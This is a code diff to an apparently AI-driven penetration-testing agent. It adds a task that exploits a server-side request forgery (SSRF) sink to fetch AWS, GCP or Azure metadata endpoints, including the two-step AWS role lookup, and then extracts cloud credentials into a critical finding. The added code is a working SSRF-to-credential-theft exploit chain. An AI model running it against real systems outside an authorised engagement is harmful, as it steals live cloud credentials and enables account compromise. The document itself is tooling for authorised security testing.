@@ -139,6 +139,8 @@ class VulnAnalysisAgent(BaseAgent):
             return await self._execute_secret_liveness_scan(payload)
         elif task_type == "race_limit_scan":
             return await self._execute_race_limit_scan(payload)
+        elif task_type == "ssrf_metadata_chain":
+            return await self._execute_ssrf_metadata_chain(payload)
         elif task_type == "correlate_findings":
             return await self._execute_correlation(payload)
         elif task_type == "triage_finding":
@@ -1040,6 +1042,131 @@ class VulnAnalysisAgent(BaseAgent):
             "findings_count": 1,
             "findings": [vuln.model_dump()],
         }
+
+    async def _ssrf_fetch_via_sink(self, metadata_url: str) -> str:
+        """Drive an in-band SSRF: place metadata_url into the configured sink and
+        return the fetched body the target echoes back. Populated by
+        _execute_ssrf_metadata_chain via closure-bound config."""
+        cfg = getattr(self, "_ssrf_chain_cfg", {})
+        url = cfg["url"]
+        param = cfg.get("param")
+        body_field = cfg.get("body_field")
+        body_format = cfg.get("body_format", "json")
+        method = cfg.get("method", "POST" if body_field else "GET")
+        base_body = cfg.get("base_body", {})
+        headers = cfg.get("headers", {})
+        try:
+            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as c:
+                if body_field:
+                    body = {**base_body, body_field: metadata_url}
+                    if body_format == "form":
+                        resp = await c.request(method, url, data=body, headers=headers)
+                    else:
+                        resp = await c.request(method, url, json=body, headers=headers)
+                else:
+                    inj = self._inject_payload(url, metadata_url, param)
+                    resp = await c.request(method, inj, headers=headers)
+                return resp.text
+        except Exception as e:
+            logger.warning("ssrf_metadata_fetch_failed", url=metadata_url, error=str(e))
+            return ""
+
+    async def _execute_ssrf_metadata_chain(self, payload: Dict[str, Any]) -> Dict[str, Any]:
+        """Chain an IN-BAND SSRF into cloud-metadata credential theft. Drives the
+        SSRF at IMDS/GCP/Azure metadata endpoints (2-step AWS role expansion),
+        extracts credentials from the echoed body, and mints a CRITICAL finding —
+        SSRF -> live cloud credentials is a top-impact chain. Secrets are REDACTED.
+
+        Payload:
+            url            in-band SSRF endpoint (echoes the fetched body)
+            param          query param the fetch-URL goes into, OR
+            body_field     body field the fetch-URL goes into (+ body_format json|form)
+            base_body, method, token/cookie
+            engagement_id  injected by _execute
+        """
+        from ai_osop.core.cloud_metadata import IMDS_TARGETS, extract_credentials
+
+        url = payload.get("url") or payload.get("target")
+        if not url:
+            raise AgentException("ssrf_metadata_chain requires 'url'")
+        engagement_id = payload.get("engagement_id") or (
+            self.ctx.current_task.engagement_id if self.ctx.current_task else None
+        )
+        if not engagement_id:
+            raise AgentException("ssrf_metadata_chain: cannot determine engagement_id")
+
+        headers: Dict[str, str] = dict(payload.get("headers") or {})
+        if payload.get("token"):
+            headers.setdefault("Authorization", f"Bearer {payload['token']}")
+            headers.setdefault("Cookie", f"token={payload['token']}")
+        if payload.get("cookie"):
+            headers["Cookie"] = payload["cookie"]
+        self._ssrf_chain_cfg = {
+            "url": url, "param": payload.get("param"), "body_field": payload.get("body_field"),
+            "body_format": payload.get("body_format", "json"),
+            "method": payload.get("method", "POST" if payload.get("body_field") else "GET"),
+            "base_body": dict(payload.get("base_body") or {}), "headers": headers,
+        }
+
+        targets = payload.get("metadata_targets") or IMDS_TARGETS
+        found = []
+        proof_url = ""
+        for base in targets:
+            body = await self._ssrf_fetch_via_sink(base)
+            creds = extract_credentials(body)
+            if creds:
+                found, proof_url = creds, base
+                break
+            # AWS 2-step: the role-list path returns a bare role name; fetch its creds.
+            if base.endswith("security-credentials/") and body.strip() and "{" not in body:
+                role = body.strip().splitlines()[0].strip()
+                if role:
+                    body2 = await self._ssrf_fetch_via_sink(base + role)
+                    creds = extract_credentials(body2)
+                    if creds:
+                        found, proof_url = creds, base + role
+                        break
+
+        if not found:
+            logger.info("ssrf_metadata_chain_clean", url=url)
+            return {"status": "success", "tool": "ssrf_metadata_chain", "target": url,
+                    "confirmed": False, "findings_count": 0}
+
+        provider = found[0]["provider"]
+        vuln = Vulnerability(
+            cwe="CWE-918",
+            vuln_type=VulnClass.SSRF,
+            severity=Severity.CRITICAL,
+            title=f"SSRF to {provider.upper()} metadata - live cloud credentials stolen",
+            description=(
+                f"The in-band SSRF at {url} was chained to the {provider} metadata service "
+                f"({proof_url}) and returned live cloud credentials, enabling full account "
+                f"compromise. This is a critical SSRF -> credential-theft chain."
+            ),
+            evidence=[{
+                "type": "ssrf_metadata_chain",
+                "provenance": "ssrf+metadata",
+                "ssrf_url": url,
+                "metadata_url": proof_url,
+                "credentials": found,  # already redacted by extract_credentials
+            }],
+            tool_source="ssrf_metadata_chain",
+            confidence=0.98,
+            validated=True,
+            exploitability="high",
+            impact="high",
+            engagement_id=engagement_id,
+        )
+        try:
+            await self.ctx.graph_memory.add_vulnerability(vuln)
+            self.findings[vuln.id] = vuln
+        except Exception as e:
+            logger.error("ssrf_metadata_persist_failed", vuln_id=vuln.id, error=str(e))
+
+        logger.info("ssrf_metadata_chain_confirmed", url=url, provider=provider, metadata_url=proof_url)
+        return {"status": "success", "tool": "ssrf_metadata_chain", "target": url,
+                "confirmed": True, "provider": provider, "findings_count": 1,
+                "findings": [vuln.model_dump()]}
 
     async def _execute_race_limit_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
         """Confirm a race-condition / limit bypass (TOCTOU, double-spend, coupon
